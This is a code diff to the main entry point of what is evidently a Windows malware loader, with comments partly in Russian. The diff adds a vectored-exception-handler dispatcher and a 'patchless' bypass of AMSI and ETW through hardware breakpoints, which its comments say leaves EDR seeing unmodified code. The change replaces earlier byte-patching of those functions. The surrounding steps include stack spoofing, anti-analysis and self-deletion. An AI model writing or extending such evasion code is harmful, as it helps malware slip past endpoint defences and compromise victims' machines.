@@ -23,6 +23,8 @@
 #include "Syscall.h"
 #include "ThreadPool.h"
 #include "GuardPage.h"
+#include "VehDispatcher.h"
+#include "PatchlessBypass.h"
 #include "KeyDerive.h"
 #include "Phantom.h"
 #include "Motw.h"
@@ -216,13 +218,17 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         StackSpoof::Init();
     }
 
-    // ── Step 2: Telemetry Killers ──
+    // ── Step 2a: Unified VEH Dispatcher ──
+    // Один VEH-обработчик для PatchlessBypass и GuardPage
+    if (GlobalConfig.bPatchlessAmsiEtw || GlobalConfig.bGuardPage) {
+        VehDispatcher::Init();
+    }
+
+    // ── Step 2b: Patchless AMSI/ETW Bypass ──
+    // Аппаратные точки останова на AmsiScanBuffer/EtwEventWrite
+    // Ноль байт модифицировано в памяти — EDR видит оригинальный код
     if (GlobalConfig.bPatchlessAmsiEtw) {
-        // M2: PatchlessBypass::EnableAmsiBypass() / EnableEtwBypass()
-        // Fallback until M2: keep byte-patching as interim
-        Telemetry::PatchAMSI();
-        Telemetry::PatchETW();
-        Telemetry::PatchETW_TI();
+        PatchlessBypass::Enable();
     }
 
     // ── Step 3: Anti-Analysis ──
@@ -374,6 +380,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     // ── Step 10: Self-Destruct (no admin needed) ──
     if (GlobalConfig.bMelt)
         Melt::SelfDestruct();
+
+    // ── Cleanup: отключаем PatchlessBypass и VehDispatcher ──
+    if (GlobalConfig.bPatchlessAmsiEtw)
+        PatchlessBypass::Disable();
+
+    VehDispatcher::Cleanup();
 
     return 0;
 }
